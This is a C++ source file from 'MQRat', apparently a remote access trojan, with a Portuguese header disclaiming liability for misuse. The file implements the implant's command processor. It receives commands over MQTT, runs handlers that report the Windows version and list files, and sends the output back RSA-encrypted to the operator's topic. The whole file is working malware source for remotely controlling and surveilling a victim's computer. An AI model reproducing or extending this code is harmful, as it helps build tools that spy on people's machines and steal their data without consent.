/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <exception>
#include <string>
#include <openssl/rsa.h>
#include <stdexcept>
#include "command_processor.hpp"
#include "api.hpp"
#include "log.hpp"
#include "mqtt_client.hpp"
#include "utils.hpp"
#include "crypto.hpp"
#include "encoders/base64.hpp"

using namespace Crypto;

#define CMDLEN_PAYLOAD_SIZE 3

static struct Command valid_commands[] = {
    { "get-osver", API::FileSystem::GetWindowsVersion },
    { "list-files", API::FileSystem::ListFiles }
};

CommandProcessor::CommandProcessor(string cmd, void *client)
{
    this->command = cmd;
    this->client = client;
    this->public_key_len = 0;
}

void CommandProcessor::Process()
{
    RSA *rsa = nullptr;
    auto client = static_cast<MqttClient*>(this->client);
    auto send_topic = client->getSendTopic();
    auto cipher = client->getCipher();

    try 
    {
        // Load public key from disk
        this->public_key = client->GetKeyManager()->ReadPublicKey();

        // Load public key into memory
        rsa = (RSA*)cipher->LoadPublicKey(this->public_key.c_str(), this->public_key.length());

        // Checks if command has some parameter
        string parameter = "";
        auto v = Utils::Split(command, ' ');
        auto has_parameter = v.size() > 1;

        // Extract command parameter
        if(has_parameter) {
            parameter = v[1];
            command = v[0];
        }

        Log::LogInfo("Parameter: %s", parameter.c_str());

        // Check if command is a valid command
        for(auto cmd : valid_commands) 
        {
            // Command found. We need to run the callback and pass parameters
            if(command == cmd.name) 
            {
                void *retval = nullptr;

                // Check if command has parameters
                if(has_parameter) {
                    auto func = bind(cmd.callback, reinterpret_cast<void*>(const_cast<char*>(parameter.c_str())));
                    retval = func();
                } else {
                    retval = cmd.callback(nullptr);
                }

                if(retval != nullptr) 
                {
                    // Send command output
                    client->PublishEncrypted(static_cast<char*>(retval), send_topic);
                
                    // Free memory
                    free(retval);
                }

                goto free_resources;
            }
        }

        // The command could not be recognized
        throw std::runtime_error("command not found: " + command);

    } catch(std::runtime_error& e) {
        Log::LogError(string("Something goes wrong: ") + e.what());
        client->SendError();
        goto free_resources;
    }

free_resources:
    Log::LogInfo("Releasing resources");

    if(rsa != nullptr) {
        // Free resources
        RSA_free(rsa);
    }
}
